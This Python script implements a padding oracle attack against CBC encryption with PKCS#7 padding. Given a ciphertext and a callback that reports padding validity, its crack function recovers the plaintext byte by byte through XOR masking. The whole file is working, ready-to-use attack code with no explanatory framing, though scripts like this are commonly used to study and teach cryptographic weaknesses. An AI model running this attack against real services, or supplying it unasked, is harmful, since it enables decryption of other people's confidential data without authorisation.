#  Script for primitive and simple Padding Oracle Attack
#  Appliable to CBC + PKCS#7
#  Author: soyccan
#  E-mail: soyccan@gmail.com
#
import logging, functools, operator

def fake_padding_mask(block_size, padding, fake_padding):
    return (b'\0' * (block_size - fake_padding + 1)
            + (padding ^ fake_padding).to_bytes(1, 'little') * (fake_padding - 1))

def one_byte_mask(block_size, index, value):
    return (b'\0' * index
            + value.to_bytes(1, 'little')
            + b'\0' * (block_size - index - 1))

def split_into_block(seq, block_size):
    return [seq[i : i+block_size] for i in range(0, len(seq), block_size)]

def xor(*args):
    return b''.join(
        functools.reduce(operator.xor, tupl).to_bytes(1, 'little')
        for tupl in zip(*args))

def crack(cipher, block_size, block_count, check_valid):
    """Padding Oracle Attack

    Args:
        cipher (bytes-like): known ciphertext whose length should
            equal block_size * block_count
        block_size (int):    size of each block
        block_count (int):   number of blocks in cipher
        check_valid (func):  a one-parameter function which accepts
            some ciphertext and returns True whenever the ciphertext
            has correct padding
            ciphertext is a bytes object, whose length is block_size * block_count
    Returns:
        (bytes): cracked plaintext, the unknown bytes is left null byte
    """
    assert len(cipher) == block_size * block_count

    cipher = split_into_block(cipher, block_size)

    plain = [bytearray(block_size) for _ in range(block_count)]
    tmp = [bytes(block_size) for _ in range(block_count)]

    for block_idx in range(block_count - 2, -1, -1):
        padding = 0
        if block_idx == block_count - 2:
            # crack padding
            for x in range(1, 256):
                mask = one_byte_mask(block_size, block_size-1, x)

                tmp[-2] = xor(cipher[block_idx], mask)
                tmp[-1] = cipher[block_idx + 1]

                logging.debug('x = %d', x)
                logging.debug('Cipher: %s %s',
                              cipher[block_idx].hex(), cipher[block_idx + 1].hex())
                logging.debug('Plain:  %s %s',
                              plain[block_idx].hex(), plain[block_idx + 1].hex())
                logging.debug('Try:    %s %s',
                              tmp[-2].hex(), tmp[-1].hex())
                logging.debug('')

                if check_valid(b''.join(tmp)):
                    padding = x ^ 1
                    logging.debug('padding = %d', padding)

                    plain[block_idx + 1][block_size - padding :] = (
                        padding.to_bytes(1, 'little') * padding)

                    break

        # crack remaining
        # if this is not last block -> padding=0
        mask = bytearray(block_size)
        for idx in range(block_size - padding - 1, -1, -1):
            fake_padding = block_size - idx
            _mask = fake_padding_mask(block_size, padding, fake_padding)

            for x in range(0, 256):
                mask[idx] = x

                tmp[-2] = xor(cipher[block_idx], mask, _mask)
                tmp[-1] = cipher[block_idx + 1]

                logging.debug('x = %d', x)
                logging.debug('Cipher: %s %s',
                              cipher[block_idx].hex(), cipher[block_idx + 1].hex())
                logging.debug('Plain:  %s %s',
                              plain[block_idx].hex(), plain[block_idx + 1].hex())
                logging.debug('Try:    %s %s',
                              tmp[-2].hex(), tmp[-1].hex())
                logging.debug('')

                if check_valid(b''.join(tmp)):
                    plain[block_idx + 1][idx] = fake_padding ^ x
                    logging.debug('plain: block %d idx %d = %d',
                                  block_idx, idx, plain[block_idx][idx])
                    mask[idx] = x ^ fake_padding ^ padding
                    break

                if x == 255:
                    logging.debug('plain: block %d idx %d fail', block_idx, idx)
                    return None

    logging.debug('Result: %s', b''.join(plain).hex())
    return b''.join(plain)
